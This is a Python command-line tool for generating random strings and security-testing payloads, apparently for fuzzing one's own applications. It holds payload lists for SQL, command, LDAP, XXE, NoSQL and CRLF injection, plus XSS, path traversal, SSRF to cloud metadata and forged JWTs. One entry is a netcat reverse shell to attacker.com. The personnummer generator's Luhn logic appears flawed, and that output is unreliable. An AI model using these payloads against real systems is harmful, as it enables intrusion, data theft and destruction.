import random
import string
import pyperclip
import argparse
import base64
import urllib.parse
import json
import csv
from datetime import datetime
from pathlib import Path


# History file path
HISTORY_FILE = Path("string_history.json")

# Directory containing test personnummer CSV files
PERSNUMBER_DIR = Path("persnumber")

def load_test_personnummer():
    """Load all test personnummer from CSV files in persnumber directory."""
    personnummer_list = []

    if not PERSNUMBER_DIR.exists():
        return personnummer_list

    csv_files = list(PERSNUMBER_DIR.glob("*.csv"))

    for csv_file in csv_files:
        try:
            with open(csv_file, 'r', encoding='utf-8') as f:
                reader = csv.reader(f)
                next(reader)  # Skip header
                for row in reader:
                    if row and row[0].strip():
                        # Format: YYYYMMDDXXXX -> YYYYMMDD-XXXX
                        pnr = row[0].strip()
                        if len(pnr) == 12 and pnr.isdigit():
                            formatted_pnr = f"{pnr[:8]}-{pnr[8:]}"
                            personnummer_list.append(formatted_pnr)
        except Exception as e:
            print(f"Warning: Could not read {csv_file.name}: {e}")

    return personnummer_list

def load_history():
    """Load generation history from file."""
    if HISTORY_FILE.exists():
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []


def save_to_history(generated_string, charset_type, length_bytes):
    """Save generated string to history."""
    history = load_history()
    entry = {
        "timestamp": datetime.now().isoformat(),
        "string": generated_string[:100] + "..." if len(generated_string) > 100 else generated_string,
        "type": charset_type,
        "length": length_bytes,
        "byte_size": len(generated_string.encode('utf-8'))
    }
    history.append(entry)

    # Keep only last 50 entries
    history = history[-50:]

    with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
        json.dump(history, f, indent=2, ensure_ascii=False)


def view_history():
    """Display generation history."""
    history = load_history()
    if not history:
        print("No history available.")
        return

    print("\n" + "=" * 70)
    print("Generation History (Last 10 entries)")
    print("=" * 70)

    for i, entry in enumerate(history[-10:], 1):
        print(f"\n{i}. {entry['timestamp']}")
        print(f"   Type: {entry['type']} | Length: {entry['length']} | Bytes: {entry['byte_size']}")
        print(f"   String: {entry['string']}")
    print("=" * 70)


def encode_string(text, encoding_type):
    """Encode string in various formats."""
    if encoding_type == 'base64':
        return base64.b64encode(text.encode()).decode()
    elif encoding_type == 'url':
        return urllib.parse.quote(text)
    elif encoding_type == 'hex':
        return text.encode().hex()
    elif encoding_type == 'html':
        return ''.join(f'&#{ord(c)};' for c in text)
    return text


def check_password_strength(password):
    """Check password strength and return score and feedback."""
    score = 0
    feedback = []

    if len(password) >= 8:
        score += 1
    else:
        feedback.append("Too short (< 8 characters)")

    if len(password) >= 12:
        score += 1

    if any(c.islower() for c in password):
        score += 1
    else:
        feedback.append("No lowercase letters")

    if any(c.isupper() for c in password):
        score += 1
    else:
        feedback.append("No uppercase letters")

    if any(c.isdigit() for c in password):
        score += 1
    else:
        feedback.append("No digits")

    if any(c in string.punctuation for c in password):
        score += 1
    else:
        feedback.append("No special characters")

    strength = ["Very Weak", "Weak", "Fair", "Good", "Strong", "Very Strong"][min(score, 5)]

    return strength, score, feedback

def calculate_luhn_check_digit(number_string):
    """
    Calculate Luhn check digit for a number string.

    Args:
        number_string: String of digits (without check digit)

    Returns:
        Check digit as integer
    """
    digits = [int(d) for d in number_string]

    # Double every second digit from right to left
    for i in range(len(digits) - 1, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9

    # Calculate check digit
    total = sum(digits)
    check_digit = (10 - (total % 10)) % 10

    return check_digit


def generate_swedish_personnummer(valid=True):
    """
    Generate Swedish social security number (personnummer).

    Args:
        valid: If True, generate valid personnummer with correct Luhn check digit.
               If False, generate invalid personnummer with incorrect check digit.

    Returns:
        Swedish personnummer in format YYYYMMDD-XXXX
    """
    # Generate random birth date (between 1900 and 2023)
    year = random.randint(1900, 2023)
    month = random.randint(1, 12)

    # Days in month (simple version, doesn't account for leap years perfectly)
    days_in_month = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    day = random.randint(1, days_in_month[month - 1])

    # Format date
    date_str = f"{year:04d}{month:02d}{day:02d}"

    # Generate 3-digit serial number (odd for males, even for females)
    serial = random.randint(0, 999)
    serial_str = f"{serial:03d}"

    # Combine date and serial (first 9 digits)
    base_number = date_str + serial_str

    if valid:
        # Calculate correct Luhn check digit
        check_digit = calculate_luhn_check_digit(base_number)
    else:
        # Generate incorrect check digit
        correct_check_digit = calculate_luhn_check_digit(base_number)
        # Pick any digit except the correct one
        wrong_digits = [d for d in range(10) if d != correct_check_digit]
        check_digit = random.choice(wrong_digits)

    # Format with dash: YYYYMMDD-XXXX
    personnummer = f"{date_str}-{serial_str}{check_digit}"

    return personnummer


def generate_string(length_bytes, charset_type=1, use_all_payloads=False):
    """
    Generate a random string or attack payload of specified length.

    Args:
        length_bytes: Length of the string to generate in bytes (ignored for payloads and personnummer)
        charset_type: Type of character set to use (1-17)
        use_all_payloads: If True, return all payloads for attack types

    Returns:
        Generated random string or attack payload(s)
    """
    if charset_type == 1:
        # Alphanumeric only (a-z, 0-9)
        characters = string.ascii_lowercase + string.digits
        return ''.join(random.choice(characters) for _ in range(length_bytes))

    elif charset_type == 2:
        # All printable ASCII characters
        characters = string.printable.strip()
        return ''.join(random.choice(characters) for _ in range(length_bytes))

    elif charset_type == 3:
        # SQL Injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'x'='x",
            "admin'--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR '1'='1' /*",
            "1' AND '1'='1",
            "' UNION SELECT * FROM users--",
            "' OR 1=1#",
            "admin' OR '1'='1'--",
            "' WAITFOR DELAY '00:00:05'--",
            "1'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
            "' AND SLEEP(5)--",
            "1' ORDER BY 10--",
        ]
        if use_all_payloads:
            return '\n'.join(sql_payloads)
        return random.choice(sql_payloads)

    elif charset_type == 4:
        # HTML/XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<marquee onstart=alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<details open ontoggle=alert('XSS')>",
            "<object data='javascript:alert(1)'>",
        ]
        if use_all_payloads:
            return '\n'.join(xss_payloads)
        return random.choice(xss_payloads)

    elif charset_type == 5:
        # Path traversal payloads
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "../../../../../../etc/shadow",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../../var/log/apache2/access.log",
            "....//....//....//windows/win.ini",
        ]
        if use_all_payloads:
            return '\n'.join(path_payloads)
        return random.choice(path_payloads)

    elif charset_type == 6:
        # Control characters
        characters = "\n\r\t\0"
        return ''.join(random.choice(characters) for _ in range(length_bytes))

    elif charset_type == 7:
        # Unicode/Emoji characters
        characters = "🔥💻🚀✨🎯🐛🔒⚡📝🌟中文العربيةहिन्दी日本語한국어"
        return ''.join(random.choice(characters) for _ in range(length_bytes))

    elif charset_type == 8:
        # Command injection payloads
        command_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; cat /etc/shadow",
            "| nc -e /bin/sh attacker.com 4444",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ping -c 10 127.0.0.1",
            "|| dir C:\\",
            "%0a whoami",
            "{cat,/etc/passwd}",
            "; id",
            "| ls -al /",
        ]
        if use_all_payloads:
            return '\n'.join(command_payloads)
        return random.choice(command_payloads)

    elif charset_type == 9:
        # Mixed dangerous characters
        characters = "'\"<>&;|%$(){}[]\\/.:-=+*!?@#~`\n\r\t"
        return ''.join(random.choice(characters) for _ in range(length_bytes))

    elif charset_type == 10:
        # LDAP injection payloads
        ldap_payloads = [
            "*",
            "*)(&",
            "*)(|(objectClass=*",
            "admin)(&(password=*)",
            "*)(uid=*))(&(uid=*",
            "*()|&'",
            "admin*",
            "*)(objectClass=*",
        ]
        if use_all_payloads:
            return '\n'.join(ldap_payloads)
        return random.choice(ldap_payloads)

    elif charset_type == 11:
        # XML/XXE injection payloads
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&file;</data>',
        ]
        if use_all_payloads:
            return '\n'.join(xxe_payloads)
        return random.choice(xxe_payloads)

    elif charset_type == 12:
        # SSRF payloads
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://[::]:80/",
            "http://0.0.0.0",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "dict://localhost:11211/",
        ]
        if use_all_payloads:
            return '\n'.join(ssrf_payloads)
        return random.choice(ssrf_payloads)

    elif charset_type == 13:
        # NoSQL injection payloads
        nosql_payloads = [
            "{'$gt':''}",
            "{'$ne':null}",
            "{'$regex':'.*'}",
            "{username: {$ne: null}, password: {$ne: null}}",
            "admin'||'1'=='1",
            "'; return true; var dummy='",
            "{$where: 'sleep(5000)'}",
        ]
        if use_all_payloads:
            return '\n'.join(nosql_payloads)
        return random.choice(nosql_payloads)

    elif charset_type == 14:
        # CRLF injection payloads
        crlf_payloads = [
            "%0d%0aSet-Cookie:admin=true",
            "\r\nSet-Cookie: sessionid=malicious",
            "%0d%0aLocation: http://attacker.com",
            "\r\n\r\n<script>alert('XSS')</script>",
            "%0aContent-Length:%200%0a%0aHTTP/1.1%20200%20OK",
        ]
        if use_all_payloads:
            return '\n'.join(crlf_payloads)
        return random.choice(crlf_payloads)

    elif charset_type == 15:
        # JWT manipulation payloads
        jwt_payloads = [
            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature',
            'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..signature',
        ]
        if use_all_payloads:
            return '\n'.join(jwt_payloads)
        return random.choice(jwt_payloads)

    elif charset_type == 16:
        # Valid Swedish personnummer (social security number) from test files
        test_personnummer = load_test_personnummer()
        if test_personnummer:
            return random.choice(test_personnummer)
        else:
            # Fallback to generation if no files found
            print("Warning: No test personnummer files found, generating instead...")
            return generate_swedish_personnummer(valid=True)

    elif charset_type == 17:
        # Invalid Swedish personnummer (social security number)
        return generate_swedish_personnummer(valid=False)

    else:
        # Default to alphanumeric
        characters = string.ascii_lowercase + string.digits
        return ''.join(random.choice(characters) for _ in range(length_bytes))


def interactive_mode():
    """Run the generator in interactive mode."""
    while True:
        print("\n" + "=" * 70)
        print("Random String Generator & Security Testing Tool")
        print("=" * 70)

        # Get character set preference first
        print("\nCharacter set options:")
        print("1. Alphanumeric only (a-z, 0-9)")
        print("2. All ASCII characters")
        print("3. SQL Injection payloads")
        print("4. HTML/XSS payloads")
        print("5. Path traversal payloads")
        print("6. Control characters (\\n \\r \\t \\0)")
        print("7. Unicode/Emoji characters (🔥💻🚀 中文 العربية)")
        print("8. Command injection payloads")
        print("9. Mixed dangerous characters")
        print("10. LDAP injection payloads")
        print("11. XML/XXE injection payloads")
        print("12. SSRF payloads")
        print("13. NoSQL injection payloads")
        print("14. CRLF injection payloads")
        print("15. JWT manipulation payloads")
        print("16. Swedish Personnummer (valid test data from Skatteverket)")
        print("17. Swedish Personnummer (invalid - with incorrect Luhn check digit)")
        print("\n0. View History")
        print("Q. Quit")

        choice = input("\nEnter your choice: ").strip().upper()

        if choice == 'Q':
            print("Goodbye!")
            break

        if choice == '0':
            view_history()
            continue

        if not choice.isdigit() or int(choice) < 1 or int(choice) > 17:
            print("Invalid choice. Please try again.")
            continue

        charset_type = int(choice)

        # For payload options, ask if user wants random or all payloads
        use_all_payloads = False
        if charset_type in [3, 4, 5, 8, 10, 11, 12, 13, 14, 15]:
            print("\nPayload options:")
            print("1. Random payload (single)")
            print("2. All payloads (entire list)")

            while True:
                payload_choice = input("\nEnter your choice (1 or 2): ").strip()
                if payload_choice == '1':
                    use_all_payloads = False
                    break
                elif payload_choice == '2':
                    use_all_payloads = True
                    break
                else:
                    print("Invalid choice. Please enter 1 or 2.")

        # Get string length from user (only if not using all payloads or personnummer)
        length_bytes = 0
        if not use_all_payloads and charset_type not in [16, 17]:
            while True:
                try:
                    length_bytes = int(input("\nEnter the desired string length in bytes: "))
                    if length_bytes <= 0:
                        print("Please enter a positive number.")
                        continue
                    break
                except ValueError:
                    print("Invalid input. Please enter a number.")

        # Ask for batch generation
        batch_count = 1
        if not use_all_payloads:
            batch_input = input("\nGenerate multiple strings? Enter count (or press Enter for 1): ").strip()
            if batch_input.isdigit() and int(batch_input) > 1:
                batch_count = int(batch_input)

        # Ask for encoding
        encoding_type = None
        if batch_count == 1 and not use_all_payloads and charset_type not in [16, 17]:
            print("\nEncoding options:")
            print("1. None (plain text)")
            print("2. Base64")
            print("3. URL encoding")
            print("4. Hex")
            print("5. HTML entities")

            enc_choice = input("\nEnter encoding choice (1-5, default 1): ").strip()
            encoding_map = {'2': 'base64', '3': 'url', '4': 'hex', '5': 'html'}
            encoding_type = encoding_map.get(enc_choice)

        # Generate the strings
        results = []
        for _ in range(batch_count):
            generated_string = generate_string(length_bytes, charset_type, use_all_payloads)

            if encoding_type:
                generated_string = encode_string(generated_string, encoding_type)

            results.append(generated_string)

        # Combine results
        final_output = '\n'.join(results) if batch_count > 1 else results[0]

        # Calculate actual byte size
        byte_size = len(final_output.encode('utf-8'))

        # Copy to clipboard
        pyperclip.copy(final_output)

        # Display result
        print("\n" + "=" * 70)
        if use_all_payloads:
            print("Generated payloads (all):")
            print(final_output)
            print("=" * 70)
            payload_count = final_output.count('\n') + 1
            print(f"Total payloads: {payload_count}")
        elif batch_count > 1:
            print(f"Generated {batch_count} strings:")
            print(final_output)
            print("=" * 70)
        else:
            print("Generated string:")
            print(final_output)
            print("=" * 70)
            print(f"String length: {len(final_output)} characters")

            # Password strength check for simple character sets
            if charset_type in [1, 2, 9]:
                strength, score, feedback = check_password_strength(final_output)
                print(f"Password Strength: {strength} ({score}/6)")
                if feedback:
                    print(f"Suggestions: {', '.join(feedback)}")

        print(f"Byte size: {byte_size} bytes")
        print("\n✓ String has been copied to clipboard!")

        # Ask to save to file
        save_choice = input("\nSave to file? (y/n, default n): ").strip().lower()
        if save_choice == 'y':
            filename = input("Enter filename (default: output.txt): ").strip() or "output.txt"

            print("\nFile format:")
            print("1. Plain text")
            print("2. JSON")
            print("3. CSV")

            format_choice = input("Choose format (1-3, default 1): ").strip()

            try:
                if format_choice == '2':
                    data = {
                        "timestamp": datetime.now().isoformat(),
                        "type": charset_type,
                        "length": length_bytes,
                        "content": final_output,
                        "byte_size": byte_size
                    }
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
                elif format_choice == '3':
                    with open(filename, 'w', newline='', encoding='utf-8') as f:
                        writer = csv.writer(f)
                        writer.writerow(['Timestamp', 'Type', 'Length', 'Content', 'Byte Size'])
                        if batch_count > 1:
                            for result in results:
                                writer.writerow([datetime.now().isoformat(), charset_type, length_bytes, result, len(result.encode('utf-8'))])
                        else:
                            writer.writerow([datetime.now().isoformat(), charset_type, length_bytes, final_output, byte_size])
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(final_output)

                print(f"✓ Saved to {filename}")
            except Exception as e:
                print(f"Error saving file: {e}")

        # Save to history
        save_to_history(final_output, charset_type, length_bytes)

        # Ask to continue
        continue_choice = input("\nGenerate another string? (y/n, default y): ").strip().lower()
        if continue_choice == 'n':
            print("Goodbye!")
            break


def main():
    """Main entry point with CLI argument support."""
    parser = argparse.ArgumentParser(
        description='Advanced String Generator & Security Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python StringCreator.py                          # Interactive mode
  python StringCreator.py -t 1 -l 32              # Generate 32-byte alphanumeric string
  python StringCreator.py -t 3 --all              # Generate all SQL injection payloads
  python StringCreator.py -t 1 -l 16 -e base64    # Generate and base64 encode
  python StringCreator.py -t 1 -l 10 -b 5         # Generate 5 random strings
  python StringCreator.py --history               # View generation history
        """
    )

    parser.add_argument('-t', '--type', type=int, choices=range(1, 18),
                        help='Character set type (1-17)')
    parser.add_argument('-l', '--length', type=int,
                        help='String length in bytes')
    parser.add_argument('--all', action='store_true',
                        help='Generate all payloads (for payload types)')
    parser.add_argument('-e', '--encode', choices=['base64', 'url', 'hex', 'html'],
                        help='Encoding format')
    parser.add_argument('-b', '--batch', type=int, default=1,
                        help='Number of strings to generate')
    parser.add_argument('-o', '--output', type=str,
                        help='Output file path')
    parser.add_argument('-f', '--format', choices=['text', 'json', 'csv'], default='text',
                        help='Output file format')
    parser.add_argument('--no-clipboard', action='store_true',
                        help='Do not copy to clipboard')
    parser.add_argument('--history', action='store_true',
                        help='View generation history')
    parser.add_argument('--custom', type=str,
                        help='Custom character set')

    args = parser.parse_args()

    # View history
    if args.history:
        view_history()
        return

    # If no type specified, run interactive mode
    if args.type is None:
        interactive_mode()
        return

    # CLI mode
    charset_type = args.type
    use_all_payloads = args.all
    length_bytes = args.length or 0

    # Validate length requirement
    if not use_all_payloads and charset_type not in [3, 4, 5, 8, 10, 11, 12, 13, 14, 15, 16, 17]:
        if not length_bytes:
            print("Error: --length is required for this character set type")
            return

    # Handle custom character set
    if args.custom:
        charset_type = 0  # Use else clause in generate_string

    # Generate strings
    results = []
    for _ in range(args.batch):
        if args.custom:
            generated_string = ''.join(random.choice(args.custom) for _ in range(length_bytes))
        else:
            generated_string = generate_string(length_bytes, charset_type, use_all_payloads)

        if args.encode and not use_all_payloads:
            generated_string = encode_string(generated_string, args.encode)

        results.append(generated_string)

    final_output = '\n'.join(results) if args.batch > 1 else results[0]

    # Output
    print(final_output)

    # Copy to clipboard unless disabled
    if not args.no_clipboard:
        pyperclip.copy(final_output)
        print("\n✓ Copied to clipboard", file=__import__('sys').stderr)

    # Save to file if specified
    if args.output:
        try:
            if args.format == 'json':
                data = {
                    "timestamp": datetime.now().isoformat(),
                    "type": charset_type,
                    "length": length_bytes,
                    "content": final_output,
                    "byte_size": len(final_output.encode('utf-8'))
                }
                with open(args.output, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
            elif args.format == 'csv':
                with open(args.output, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Timestamp', 'Type', 'Length', 'Content', 'Byte Size'])
                    for result in results:
                        writer.writerow([datetime.now().isoformat(), charset_type, length_bytes, result, len(result.encode('utf-8'))])
            else:
                with open(args.output, 'w', encoding='utf-8') as f:
                    f.write(final_output)

            print(f"✓ Saved to {args.output}", file=__import__('sys').stderr)
        except Exception as e:
            print(f"Error saving file: {e}", file=__import__('sys').stderr)

    # Save to history
    save_to_history(final_output, charset_type, length_bytes)


if __name__ == "__main__":
    main()
